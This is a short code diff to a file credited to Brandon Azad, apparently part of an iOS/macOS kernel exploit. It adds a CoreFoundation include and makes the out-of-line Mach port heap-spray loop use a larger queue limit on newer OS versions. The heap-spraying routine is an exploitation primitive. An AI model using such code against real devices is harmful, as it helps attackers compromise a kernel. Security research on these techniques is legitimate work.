@@ -3,7 +3,7 @@
  * Brandon Azad
  */
 #include "kernel_alloc.h"
-
+#include <CoreFoundation/CoreFoundation.h>
 #include <assert.h>
 #include <fcntl.h>
 #include <pthread.h>
@@ -356,7 +356,7 @@ ool_ports_spray_size_with_gc(mach_port_t *holding_ports, size_t *holding_port_co
 	for (; ports_used < port_count && ools_left > 0; ports_used++) {
 		// Spray this port one message at a time until we've maxed out its queue.
 		size_t messages_sent = 0;
-		for (; messages_sent < MACH_PORT_QLIMIT_DEFAULT && ools_left > 0; messages_sent++) {
+		for (; messages_sent < (kCFCoreFoundationVersionNumber >= 1535.12 ? MACH_PORT_QLIMIT_MAX : MACH_PORT_QLIMIT_DEFAULT) && ools_left > 0; messages_sent++) {
 			// If we've crossed the GC sleep boundary, sleep for a bit and schedule the
 			// next one.
 			if (sprayed >= next_gc_step) {
